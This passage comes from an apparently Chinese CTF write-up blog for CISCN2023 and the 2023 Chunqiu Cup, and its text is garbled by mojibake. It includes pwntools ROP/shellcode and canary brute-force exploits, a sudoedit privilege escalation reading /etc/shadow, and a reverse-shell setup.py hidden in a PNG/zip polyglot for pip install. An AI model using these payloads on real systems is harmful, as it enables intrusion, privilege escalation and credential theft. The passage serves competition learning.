class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="number">0x1000</span>) + p64(pop_rdx_rbx) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>) + p64(mprotect)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx_rbx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="funcanary"><a class="markdownIt-Anchor" href="#funcanary"></a> funcanary</h3>
<p>çˆ†ç ´canaryï¼Œè·³è·ƒåˆ°shellå‡½æ•°ï¼Œgetflag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;123.56.238.150&quot;</span>,<span class="number">45498</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">padding = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        </span><br><span class="line">        payload = padding+canary+p8(y)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        info = p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(info)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;stack&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(info):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    canary += p8(y)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success get blasting!&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\x31&#x27;</span>+p8((i&lt;&lt;<span class="number">4</span>)+<span class="number">2</span>)    </span><br><span class="line">    p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="ç­¾åˆ°å¡"><a class="markdownIt-Anchor" href="#ç­¾åˆ°å¡"></a> ç­¾åˆ°å¡</h3>
<p><code>print(open('/flag').read())</code></p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNas4BimcOVLs4iDtKzHBmp-.png" alt="img"></p>
<h3 id="è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"><a class="markdownIt-Anchor" href="#è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡"></a> è¢«åŠ å¯†çš„ç”Ÿäº§æµé‡</h3>
<p>è¿½è¸ªTCPæµé‡ï¼Œ0å·æŠ¥æ–‡</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNanMeMeGA9PSJNdkbdFabpe.png" alt="img"></p>
<p>Base32è§£ç å³å¯</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNagYDq1L61IeadB2kmkDz0N.png" alt="img">flagï¼š</p>
<p>flag{c1f_fi1g_1000}</p>
<h3 id="å›½ç²¹"><a class="markdownIt-Anchor" href="#å›½ç²¹"></a> å›½ç²¹</h3>
<p>é¢˜ç›®.pngä½œä¸ºåæ ‡ï¼Œaä½œä¸ºyåæ ‡ï¼Œkä½œä¸ºxåæ ‡ï¼Œç»˜åˆ¶åæ ‡å›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">key = Image.<span class="built_in">open</span>(<span class="string">&quot;é¢˜ç›®.png&quot;</span>)</span><br><span class="line">Y = Image.<span class="built_in">open</span>(<span class="string">&quot;a.png&quot;</span>)</span><br><span class="line">X = Image.<span class="built_in">open</span>(<span class="string">&quot;k.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">KEY = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">43</span>):</span><br><span class="line">    newX = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">53</span>, <span class="number">73</span>))</span><br><span class="line">    newY = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">53</span>, <span class="number">73</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">53</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">146</span>):</span><br><span class="line">            <span class="keyword">if</span> y &lt; <span class="number">73</span>:</span><br><span class="line">                newY.putpixel((x, y), key.getpixel((i * <span class="number">53</span> + x, y)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                newX.putpixel((x, y - <span class="number">73</span>), key.getpixel((i * <span class="number">53</span> + x, y)))</span><br><span class="line">    KEY[md5(newY.tobytes(<span class="string">&quot;hex&quot;</span>, <span class="string">&quot;rgb&quot;</span>)).hexdigest()] = i</span><br><span class="line"></span><br><span class="line">xList = []</span><br><span class="line">yList = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">341</span>):</span><br><span class="line">    newX = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">53</span>, <span class="number">73</span>))</span><br><span class="line">    newY = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">53</span>, <span class="number">73</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">53</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">73</span>):</span><br><span class="line">            newX.putpixel((x, y), X.getpixel((i * <span class="number">53</span> + x, y)))</span><br><span class="line">            newY.putpixel((x, y), Y.getpixel((i * <span class="number">53</span> + x, y)))</span><br><span class="line">    xList += [KEY[md5(newX.tobytes(<span class="string">&quot;hex&quot;</span>, <span class="string">&quot;rgb&quot;</span>)).hexdigest()]]</span><br><span class="line">    yList += [KEY[md5(newY.tobytes(<span class="string">&quot;hex&quot;</span>, <span class="string">&quot;rgb&quot;</span>)).hexdigest()]]</span><br><span class="line"></span><br><span class="line">plt.scatter(yList, xList)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNaIvMCAzZxH3YkleXesUgFO.png" alt="img"></p>
<h3 id="pyshell"><a class="markdownIt-Anchor" href="#pyshell"></a> pyshell</h3>
<p>&quot;_+&quot;æ‹¼æ¥å‘½ä»¤æ‰§è¡Œ,æ„é€ <code>__import__('os').system('cat /flag'))</code></p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNYNW10Ir95NhJVLVowRrQNQ.png" alt="img"></p>
<p>æœ€åeval(_)æ‰§è¡Œå³å¯è·å–flag</p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="sm2"><a class="markdownIt-Anchor" href="#sm2"></a> SM2</h3>
<p>å…ˆè®¿é—®è·å–id</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.106.48.123:13247/api/login&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;school&quot;</span>: <span class="string">&quot;school-name&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;name-string&quot;</span>,</span><br><span class="line">    <span class="string">&quot;phone&quot;</span>: <span class="string">&quot;phone-number&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">re_data = requests.post(url, data = data)</span><br><span class="line">re_id = re_data.text</span><br><span class="line"><span class="built_in">print</span>(re_id)</span><br><span class="line"><span class="comment"># id=&#x27;3cec0a4b-624d-44f4-a5e1-f936457687e8&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨çº¿éšæœºç”Ÿæˆsm2çš„å…¬ç§é’¥</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNadd0utRbhHKJRScKXcvT_W.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.106.48.123:13247/api/allkey&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;3cec0a4b-624d-44f4-a5e1-f936457687e8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;publicKey&quot;</span>: <span class="string">&quot;960967D876671FBF46B63F25616B3105CE79B59E3B495F454B86F5AAB4C1880BF4EFDF2C73605CB6F46B649DFD5E63FF4A8603FF87A076CF1255CDB8611D71EA &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re_data = requests.post(url, data = data)</span><br><span class="line">re_private_key = re_data.text</span><br><span class="line"><span class="built_in">print</span>(re_private_key)</span><br><span class="line"><span class="comment"># &quot;publicKey&quot;: &quot;043caeb6dd180378813124a141f1ff9defcc1051090e6f48658f758bc485c7f5d0b0d5c36babed4c82680cb5144452a7c18ffa33b89be67b6e10653f92725aea35&quot;,</span></span><br><span class="line"><span class="comment"># &quot;privateKey&quot;: &quot;c968e50e09b08bd123b4595aefe322029f7b86943ce406c7e59c166c76da26b9&quot;,</span></span><br><span class="line"><span class="comment"># &quot;randomString&quot;: &quot;e029150163ebb303c02e0efefdbd436174dbaf0a800910ea9e454c9b0b91b6e30aec8c32fc8e5fbc70adfe7be302d72504a41e30ba1a65ce736ab94d39c78012bdb4a27c4a537ad699e4ec4fd24870b6ba5288941a304c1dbd33757cfcc29c6132f6b78e9984a0dcb80a39340f124f72&quot;,</span></span><br><span class="line"><span class="comment"># &quot;id&quot;: &quot;3cec0a4b-624d-44f4-a5e1-f936457687e8&quot;</span></span><br></pre></td></tr></table></figure>
<p>è·å–æœåŠ¡ç«¯è¿”å›çš„ç§é’¥å’Œrandomï¼Œå»è§£å¯†ï¼š</p>
<p>åˆ©ç”¨æœ€å¼€å§‹åœ¨çº¿ç”Ÿæˆçš„private_keyå»è§£å¯†randomstring;</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNaqR_3A5t1E97Op_pMGsEBZ.png" alt="img"></p>
<p>è§£å¯†å®Œæˆä¹‹ååˆ©ç”¨è§£å‡ºæ¥çš„hexä½œä¸ºkeyè§£å¯†private_keyçš„sm4ï¼š</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNaDN71-qF5D2beTUdQWXKql.png" alt="img"></p>
<p>è¿™é‡Œçš„privateæ˜¯æœåŠ¡å™¨è¿”å›çš„å€¼ï¼Œç„¶åå†åˆ©ç”¨è¿™ä¸ªæ ¡éªŒåçš„privateå»è§£å¯†quantumstringï¼š</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/AgAABY8QiNYAcTOXVnxAsrSK9zDYkzUB.png" alt="img"></p>
<p>ä½¿ç”¨è·å¾—çš„hexä½œä¸ºå¯†æ–‡å†…å®¹è®¿é—®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://39.106.48.123:13247/api/search&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;3cec0a4b-624d-44f4-a5e1-f936457687e8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;quantumString&quot;</span>: <span class="string">&quot;05B90B94D9C62BE47FD73A3D31679C04&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">re_data = requests.post(url, data = data)</span><br><span class="line">re_private_key = re_data.text</span><br><span class="line"><span class="built_in">print</span>(re_private_key)</span><br><span class="line"><span class="comment"># &quot;publicKey&quot;: &quot;043caeb6dd180378813124a141f1ff9defcc1051090e6f48658f758bc485c7f5d0b0d5c36babed4c82680cb5144452a7c18ffa33b89be67b6e10653f92725aea35&quot;,</span></span><br><span class="line"><span class="comment"># &quot;privateKey&quot;: &quot;c968e50e09b08bd123b4595aefe322029f7b86943ce406c7e59c166c76da26b9&quot;,</span></span><br><span class="line"><span class="comment"># &quot;randomString&quot;: &quot;e029150163ebb303c02e0efefdbd436174dbaf0a800910ea9e454c9b0b91b6e30aec8c32fc8e5fbc70adfe7be302d72504a41e30ba1a65ce736ab94d39c78012bdb4a27c4a537ad699e4ec4fd24870b6ba5288941a304c1dbd33757cfcc29c6132f6b78e9984a0dcb80a39340f124f72&quot;,</span></span><br><span class="line"><span class="comment"># &quot;id&quot;: &quot;3cec0a4b-624d-44f4-a5e1-f936457687e8&quot;</span></span><br><span class="line"><span class="comment"># &quot;quantumString&quot;: &quot;92a6fdeeb467bef57a0948ef9dc64c6e377b5d9e3fc2591aa8335adea68306725cd9165be3b1e8be2c63f848ca9cc86af521c3c682c2d42b5582561ce3e1d354a0f13253600e041a8d31da98110dc5861a923d82d10dcd9478627034dded6570649974500b19f843882f011d94d43d16&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/001.png" alt="001"></p>
<h3 id="sign_in_passwd"><a class="markdownIt-Anchor" href="#sign_in_passwd"></a> Sign_in_passwd</h3>
<p>æ¢è¡¨Base</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D&quot;</span></span><br><span class="line"></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">string1= <span class="string">&quot;GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>
<h3 id="å¯ä¿¡åº¦é‡"><a class="markdownIt-Anchor" href="#å¯ä¿¡åº¦é‡"></a> å¯ä¿¡åº¦é‡</h3>
<p>éé¢„æœŸï¼š<code>grep -ra &quot;flag&#123;&quot; / 2&gt;/dev/null</code></p>
<p>å‡å¯è·å¾—flag</p>
<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
<h3 id="babyre"><a class="markdownIt-Anchor" href="#babyre"></a> babyre</h3>
<p>æŸ¥çœ‹å†…å®¹çœ‹åˆ°<a href="https://snap.berkeley.edu">https://snap.berkeley.edu</a></p>
<p>æ‰“å¼€ç¨‹åºå¹¶è¿è¡Œï¼Œlockå³ä¸ºä¸»é€»è¾‘</p>
<p><img src="/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/image-20230528193423171.png" alt="image-20230528193423171"></p>
<p>ä¸»é€»è¾‘ä¸ºè¾“å…¥çš„åä¸€ä½ä¸å‰ä¸€ä½è¿›è¡Œå¼‚æˆ–åå­˜å‚¨è‡³testï¼Œç„¶åä¸secretè¿›è¡Œæ¯”è¾ƒ</p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=[<span class="number">102</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">28</span>, <span class="number">74</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">85</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">75</span>, <span class="number">20</span>, <span class="number">92</span>, <span class="number">92</span>, <span class="number">8</span>, <span class="number">28</span>, <span class="number">25</span>, <span class="number">81</span>, <span class="number">83</span>, <span class="number">7</span>, <span class="number">28</span>, <span class="number">76</span>, <span class="number">88</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">4</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">87</span>, <span class="number">30</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(secret)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(secret[i-<span class="number">1</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    secret[i] = secret[i] ^ secret[i-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>èµ›äº‹Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Reverse</tag>
        <tag>Misc</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023æ˜¥ç§‹æ¯æ˜¥å­£èµ›-Writeup</title>
    <url>/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/</url>
    <content><![CDATA[<p>ç¬¬ä¸€æ¬¡æŒ‚ç€å®éªŒå®¤çš„åç§°å»å†²æ¦œï¼Œæ‹¿ä¸‹äº†ä¸€ä¸ªæ€»æ¦œç¬¬16çš„æˆç»©ï¼Œåªèƒ½è¯´ï¼Œä¸ªäººçš„èƒ½åŠ›ç»ˆç©¶æ˜¯æœ‰é™çš„ã€‚</p>
<p>åœ†äº†ä¸€ä¸ª<code>AK misc</code>å•æ–¹å‘çš„æ¢¦ï¼Œä¸ƒå¤©çš„æ—¶é—´30é“é¢˜ï¼Œç»™è¶³äº†è§£é¢˜æ—¶é—´ï¼Œå¯æƒœäº†ï¼Œè‡ªå·±Binçš„çŸ¥è¯†å¤ªè–„å¼±äº†ï¼ˆè¯¥*ï¼‰ï¼ŒWebå†™çš„å¾ˆå¼€å¿ƒå“ˆå“ˆå“ˆå“ˆï¼Œè™½ç„¶åœ¨æ‰¾qcmsæ³¨å…¥ç‚¹çš„æ—¶å€™æ‰¾äº†å¥½ä¹…ï¼Œæœ€åä¹Ÿç®—æ˜¯æ³¨å‡ºæ¥äº†ã€‚å››å¤©é€šå®µï¼ŒæŒºåˆºæ¿€çš„ï¼Œé¢˜ç›®è´¨é‡å‚å·®ä¸é½ï¼Œä¸å¥½è¯„ä»·ï¼Œæ•´ä½“ä½“ä½“éªŒæ¥è¯´ï¼Œ85åˆ†ï¼</p>
<span id="more"></span>
<h1 id="birkenwald-writeup"><a class="markdownIt-Anchor" href="#birkenwald-writeup"></a> Birkenwald-Writeup</h1>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="sudo"><a class="markdownIt-Anchor" href="#sudo"></a> sudo</h3>
<p>ç™»å½•ï¼š</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449177157910.png" alt="img"></p>
<p>æŸ¥çœ‹sudoç‰ˆæœ¬ï¼š</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449178229113.png" alt="img"></p>
<p>å¥½çš„ï¼Œä¸€çœ¼æœ‰CVEï¼ˆå…¶å®æ˜¯åˆšå¥½çœ‹è¿‡è¿™ä¸ªCVEå¤ç°æ–‡ç« ï¼‰</p>
<p><a href="https://www.wevul.com/315.html">CVE-2023-22809 Linux Sudoæƒé™æå‡æ¼æ´å¤ç°ï¼ˆå«POCï¼‰ - å¨æ­¦ç½‘å®‰ (wevul.com)</a></p>
<p>ç§»åŠ¨åˆ°etcç›®å½•ï¼Œå°è¯•ææƒè¯­å¥ï¼š</p>
<p><code>SUDO_EDITOR='cat -- /etc/shadow' sudoedit /etc/GAMELAB</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449181017516.png" alt="img"></p>
<p>èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥è¯»flagï¼š</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449182400419.png" alt="img"></p>
<h3 id="piphack"><a class="markdownIt-Anchor" href="#piphack"></a> piphack</h3>
<p>ç®€å•è¯´ä¸€ä¸‹ï¼Œå°±æ˜¯pyqiçš„rceæ¼æ´ï¼Œç›´æ¥æ£€ç´¢â€œpip install rceâ€å°±è¡Œï¼Œé¢˜ç›®è¿‡æ»¤äº†</p>
<p>â€œhttpâ€ã€â€œhttpsâ€ï¼Œèƒ½é€šå¤–ç½‘ï¼Œç©ºæ ¼è¿‡æ»¤å°±è¡Œ</p>
<p>åˆ¶ä½œå›¾ç‰‡é©¬ï¼š</p>
<p>é€‰ä¸€å¼ å–œæ¬¢çš„hutao.pngï¼Œç¼–å†™åå¼¹shellçš„poc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line">  <span class="keyword">import</span> socket, time,pty, os</span><br><span class="line">  host=<span class="string">&#x27;vps_ip&#x27;</span></span><br><span class="line">  port= xxxx</span><br><span class="line">  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  s.settimeout(<span class="number">10</span>)</span><br><span class="line">  s.connect((host,port))</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">  os.putenv(<span class="string">&quot;HISTFILE&quot;</span>,<span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">  pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">  s.close()</span><br><span class="line">con()</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&quot;root&quot;</span>, version=<span class="string">&quot;1.0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><a href="http://xn--setup-dq1hw1h1z8a.py">ä¿å­˜ä¸ºsetup.py</a>ï¼Œç„¶åæ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œå‹ç¼©ä¸ºä¸€ä¸ªå‹ç¼©åŒ…</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449194061322.png" alt="img"></p>
<p>åˆ¶ä½œå›¾ç§ï¼š</p>
<p><code>copy /b hutao.png + TWe1v3.zip TWe1v3.png</code></p>
<p>å°†å›¾ç‰‡ä¸Šä¼ è‡³å…¬ç½‘å›¾åºŠï¼Œå¤åˆ¶è¿æ¥</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449197381125.png" alt="img"></p>
<p>vpså¼€å¯ç›‘å¬åï¼Œæ‰§è¡Œ<code>pip install &quot;   xxxxx.png&quot;</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449200762428.png" alt="img"></p>
<p>è·å¾—shellï¼Œç›´æ¥è·³è½¬åˆ°æ ¹ç›®å½•ï¼Œè¯»å–flag</p>
<h3 id="wordle"><a class="markdownIt-Anchor" href="#wordle"></a> wordle</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449214933931.png" alt="img"></p>
<p>ç»¿è‰²ä»£è¡¨ä½ç½®å’Œå­—æ¯éƒ½å¯¹äº†ï¼Œé»„è‰²åˆ™ä»£è¡¨å­—æ¯å¯¹äº†ï¼Œä½ç½®ä¸å¯¹ï¼Œä¸€èˆ¬çŸ¥é“ä¸‰ä¸ªå­—æ¯çš„æ—¶å€™å¯ä»¥ç›´æ¥åˆ©ç”¨è¯å…¸æ¥æšä¸¾ï¼Œè®°å¾—è‡ªåšçš„ï¼Œç°è‰²çš„åˆ™ä»£è¡¨ä¸å«è¯¥å­—æ¯ï¼Œå¯ä»¥å†™ä¸ªæ­£åˆ™è·‘ä¸€ä¸‹</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449236632534.png" alt="img"></p>
<p>æ­£ç¡®ä¸ºpause</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449238878437.png" alt="img"></p>
<h3 id="58å’Œ64"><a class="markdownIt-Anchor" href="#58å’Œ64"></a> 58å’Œ64</h3>
<p>ç›´æ¥ä¸€é”®å‡ºflagï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base58 <span class="keyword">import</span> b58decode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_files</span>(<span class="params">directory</span>):</span><br><span class="line">    output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14268</span>):</span><br><span class="line">        filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        filepath = os.path.join(directory, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(content) <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        decoded = b58decode(content).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                        output += decoded</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;filename&#125;</span> decode error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;filename&#125;</span> Error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span 